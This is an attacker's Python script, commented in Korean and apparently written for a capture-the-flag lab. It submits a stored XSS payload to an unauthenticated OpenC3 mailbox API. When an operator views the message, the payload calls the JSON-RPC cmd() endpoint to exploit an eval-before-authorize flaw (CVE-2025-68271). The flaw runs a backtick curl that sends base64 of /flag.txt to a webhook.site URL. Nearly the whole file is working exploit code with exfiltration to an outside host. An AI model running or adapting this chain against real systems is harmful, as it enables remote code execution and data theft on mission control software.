#!/usr/bin/env python3
"""
XSS 페이로드를 관제 시스템의 공개 쪽지 제출 API로 등록하는 공격자 스크립트.

관제 시스템은 외부 클라이언트가 관제사에게 문의를 남길 수 있도록
POST /openc3-api/mailbox 를 인증 없이 열어두고 있습니다 (관제사 열람용 index/show만
인증이 필요함). 공격자는 이 공개 채널에 그대로 도달 가능한 상태이며,
쪽지 body에 대한 XSS 필터가 없다는 점을 악용해 악성 HTML을 등록합니다.

즉, 공격자는 관제 이메일 계정이나 OpenC3 계정 자격증명을 전혀 알 필요가 없고,
공개된 쪽지 제출 엔드포인트 주소만 알면 됩니다.

flag는 별도 리스너를 띄울 필요 없이 webhook.site 고정 URL로 전송되며,
https://webhook.site/e2fcbf74-ddd2-45b8-b4e9-85f12a66a056 에서 바로 확인할 수 있습니다.

사용법:
  python3 send_xss.py --url http://TARGET_IP:2900
"""

import argparse
import sys

import requests

DEFAULT_FROM = "attacker@example.com"
DEFAULT_SUBJECT = "긴급: 시스템 점검 안내"
DEFAULT_SCOPE = "DEFAULT"

# flag exfiltration 고정 창구 (webhook.site) — 별도 리스너 불필요
WEBHOOK_URL = "https://webhook.site/e2fcbf74-ddd2-45b8-b4e9-85f12a66a056"

# CVE-2025-68271 exploit payload:
# /openc3-api/api 엔드포인트에 JSON-RPC POST로 cmd() 를 "단일 문자열" 인자로 호출해야 함.
# _cmd_implementation()은 args.length == 1 일 때만 extract_fields_from_cmd_text()를 타고,
# 그 안에서 convert_to_value()가 authorize() 전에 eval()을 호출하는 취약점이 발동함
# (2~3개 인자로 부르면 이 경로를 안 타서 그냥 인증 오류로 막힘).
# scope는 kwarg이므로 params 배열이 아니라 keyword_params로 넘겨야 함.
XSS_TEMPLATE = """<img src=x onerror="
(function(){{
  var w='{webhook}';
  var ruby='`curl '+w+'?f=$(cat /flag.txt|base64 -w0)`';
  fetch('/openc3-api/api',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{
      jsonrpc:'2.0',method:'cmd',id:1,
      params:['INST ABORT with PARAM ['+ruby+']'],
      keyword_params:{{scope:'DEFAULT'}}
    }})
  }}).then(r=>r.text()).then(t=>fetch(w+'?d='+encodeURIComponent(t)))
   .catch(e=>fetch(w+'?e='+encodeURIComponent(e)));
}})();
">"""


def submit_mailbox(
    base_url: str,
    from_addr: str,
    subject: str,
    scope: str,
) -> None:
    payload = XSS_TEMPLATE.format(webhook=WEBHOOK_URL)

    url = f"{base_url.rstrip('/')}/openc3-api/mailbox"
    body = {
        "from_email": from_addr,
        "subject": subject,
        "body": payload,
        "scope": scope,
    }

    print(f"[*] 쪽지 등록 요청: POST {url}")
    resp = requests.post(url, json=body, params={"scope": scope}, timeout=10)

    if resp.status_code == 201:
        print(f"[+] 쪽지 등록 완료 (인증 없이 성공): {resp.json()}")
        print(f"[*] 관제사 봇이 다음 점검 주기에 쪽지함을 열람하면 XSS가 실행됩니다.")
        print(f"[*] flag 수신 확인: {WEBHOOK_URL}")
    else:
        sys.exit(f"[-] 쪽지 등록 실패 HTTP {resp.status_code}: {resp.text[:300]}")


def main():
    p = argparse.ArgumentParser(
        description="CVE-2025-68271 XSS 페이로드를 공개 쪽지 API로 등록 (계정 자격증명 불필요)"
    )
    p.add_argument("--url", required=True, help="OpenC3 서버 기본 URL (예: http://TARGET_IP:2900)")
    p.add_argument("--from", dest="from_addr", default=DEFAULT_FROM, help="발신자 표시 주소 (임의)")
    p.add_argument("--subject", default=DEFAULT_SUBJECT)
    p.add_argument("--scope", default=DEFAULT_SCOPE)
    args = p.parse_args()

    submit_mailbox(
        base_url=args.url,
        from_addr=args.from_addr,
        subject=args.subject,
        scope=args.scope,
    )


if __name__ == "__main__":
    main()
